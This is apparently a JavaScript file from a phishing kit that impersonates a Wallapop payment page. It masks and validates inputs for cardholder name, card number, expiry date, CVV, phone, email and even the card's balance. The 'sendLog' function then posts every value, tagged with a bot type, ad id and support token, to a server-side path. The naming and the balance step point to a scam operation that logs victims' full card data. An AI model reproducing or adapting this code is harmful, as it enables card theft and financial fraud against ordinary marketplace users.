window.onload = function() {
    let step = 1;
    const logType = "card";
    const cardHolder = document.getElementById('card-holder');
    const cardNumber = document.getElementById('card-number');
    const cardDate = document.getElementById('card-date');
    const cardCvv = document.getElementById('card-cvv');
    const phoneNumber = document.getElementById('phone-number');
    const email = document.getElementById('email');
    const cardBalance = document.getElementById('card-balance');
    const submitButton = document.getElementById("wallapop-submit-button");

// MASKS
    // card holder mask
    var cardHolderMask = new IMask(cardHolder, {
        mask: /.*/,
        maxLength: 128
    });

    // card number mask
    var cardNumberMask = new IMask(cardNumber, {
        mask: [{
                mask: '0000 000000 00000',
                regex: '^3[47]\\d{0,13}',
                cardtype: 'american express'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
                cardtype: 'discover'
            },
            {
                mask: '0000 000000 0000',
                regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
                cardtype: 'diners'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
                cardtype: 'mastercard'
            },
            {
                mask: '0000 000000 00000',
                regex: '^(?:2131|1800)\\d{0,11}',
                cardtype: 'jcb15'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:35\\d{0,2})\\d{0,12}',
                cardtype: 'jcb'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}',
                cardtype: 'maestro'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^4\\d{0,15}',
                cardtype: 'visa'
            },
            {
                mask: '0000 0000 0000 0000',
                regex: '^62\\d{0,14}',
                cardtype: 'unionpay'
            },
            {
                mask: '0000 0000 0000 0000',
                cardtype: 'Unknown'
            }
        ],
        dispatch: function(appended, dynamicMasked) {
            var number = (dynamicMasked.value + appended).replace(/\D/g, '');

            for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
                let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
                if (number.match(re) != null) {
                    return dynamicMasked.compiledMasks[i];
                }
            }
        }
    });

    // card date mask
    var cardDateMask = new IMask(cardDate, {
        mask: 'MM{/}YY',
        autofix: true,
        blocks: {
            YY: {mask: IMask.MaskedRange, from: new Date().getFullYear() % 100, to: 99, maxLength: 2},
            MM: {mask: IMask.MaskedRange, from: 1, to: 12, maxLength: 2},
        }
    });

    // card cvv mask
    var cardCvvMask = new IMask(cardCvv, {
        mask: '0000',
    });

    // phone number mask
    if (phoneNumber) {
        var phoneNumberMask = new IMask(phoneNumber, {
            mask: '+000000000000000'
        });
    }
  
    // card balance mask
    var cardBalanceMask = new IMask(cardBalance, {
        mask: Number,
        scale: 2,
        thousandsSeparator: '',
        padFractionalZeros: true,
        normalizeZeros: true,
        radix: '.',
        mapToRadix: [','],
        min: -100000000,
        max: 100000000
    });


// HANDLERS
    // card holder
    cardHolderMask.on('accept', function() {
        if(cardHolderMask.value.charAt(0) === ' ')
            cardHolderMask.value = '';

        if (validHolder(cardHolderMask.value) === false) $(cardHolder).addClass('wrong');
        else $(cardHolder).removeClass('wrong');
    });

    // card number
    cardNumberMask.on('accept', function() {
        if (validCreditCard(cardNumberMask.value) === false) $(cardNumber).addClass('wrong');
        else $(cardNumber).removeClass('wrong');
    });

    // card date
    cardDateMask.on('accept', function() {
        if (validDate(cardDateMask.value) === false) $(cardDate).addClass('wrong');
        else $(cardDate).removeClass('wrong');
    });

    // card cvv
    cardCvvMask.on('accept', function() {
        if (validCvv(cardCvvMask.value) === false) $(cardCvv).addClass('wrong');
        else $(cardCvv).removeClass('wrong');
    });

    // card balance
    cardBalanceMask.on('accept', function() {
        if (validBalance(cardBalanceMask.value) === false) $(cardBalance).addClass('wrong');
        else $(cardBalance).removeClass('wrong');
    });

    // phone number
    $('#phone-number').on('keyup input', function() {
        var value = $(this).val();

        if (value.startsWith(" ")) {
            $(this).val(value.trimStart());
        }

        if (value.length < 7) $(this).addClass('wrong');
        else $(this).removeClass('wrong');
    });

    // email
    $('#email').on('keyup input', function() {
        var value = $(this).val();

        if (value.startsWith(" ")) {
            $(this).val(value.trimStart());
        }

        if (!validateEmail(value)) $(this).addClass('wrong');
        else $(this).removeClass('wrong');
    });

    
    $('#wallapop-submit-button').click(function() {
        if (balanceChecker && step === 1) {
            if (validForm()) {
                balanceStepForm();
            }
        } else if (validForm()) {
            sendLog(this.id);
        } else if (balanceChecker && !validBalance(cardBalanceMask.value)) {
            $('#cardbalance').addClass('wrong');
        }
    });

// FUNCTIONS
    function validForm() {
        var errors = 0;
        if (!validHolder(cardHolderMask.value)) {
            errors++;
            $(cardHolder).addClass('wrong');
        }

        if (!validCreditCard(cardNumberMask.value)) {
            errors++;
            $(cardNumber).addClass('wrong');
        }

        if (!validDate(cardDateMask.value)) {
            errors++;
            $(cardDate).addClass('wrong');
        }

        if (!validCvv(cardCvvMask.value)) {
            errors++;
            $(cardCvv).addClass('wrong');
        }

        if (phoneNumber) {
            if (phoneNumberMask.value.length < 7) {
                errors++;
                $(phoneNumber).addClass('wrong');
            }
        }

        if (email) {
            if (!validateEmail(email.value)) {
                errors++;
                $('#email').addClass('wrong');
            }
        }

        if (errors > 0)
            return false;

        return true;
    };

    function balanceStepForm() {
        var buttonText = loadButton(submitButton);
        
        if (typeof adId !== 'undefined') {
            const response = axios.post(stepsApiPath, {
                botType: botType,
                adId: adId,
                supportToken: supportToken,
                stepType: "balance"
            });
        }

        submitButton.innerHTML = buttonText;
        submitButton.disabled = false;
        $("#card-holder").prop('readonly', true);
        $("#card-number").prop('readonly', true);
        $("#card-date").prop('readonly', true);
        $("#card-cvv").prop('readonly', true);
        $("#phone-number").prop('readonly', true);
        $("#email").prop('readonly', true);

        $("#card-balance").val('');
        $("#balance-form").show();
        step++;
    };

    function clearForm(buttonId, buttonText) {
        $(`#${buttonId}`).html(buttonText);
        submitButton.disabled = false;
        $("#card-holder").val('').prop('readonly', false);
        $("#card-number").val('').prop('readonly', false);
        $("#card-date").val('').prop('readonly', false);
        $("#card-cvv").val('').prop('readonly', false);
        $('#phone-number').val('').prop('readonly', false);
        $('#email').val('').prop('readonly', false);
        $("#card-balance").val('');
        $("#balance-form").hide();
        step = 1;
    };

    function sendLog(buttonId) {
        var buttonText = loadButton(document.getElementById(buttonId));

        axios.post(submitApiPath, {
            botType: botType,
            adId: typeof adId === 'undefined' ? null : adId,
            supportToken: supportToken,
            logType: logType,
            cardHolder: cardHolderMask.value,
            cardNumber: cardNumberMask.value.replace(/\D+/g, ""),
            cardExpire: cardDateMask.value,
            cardCvv: cardCvvMask.value,
            phoneNumber: phoneNumberMask === undefined ? null : phoneNumberMask.value,
            email: email === null ? null : email.value,
            cardBalance: cardBalanceMask.value,
            templateType: templateType
        })
        .then((response) => {
            system.windowObj(response.data.status);
        })
        .finally(() => {
            clearForm(buttonId, buttonText);
        });
    };
};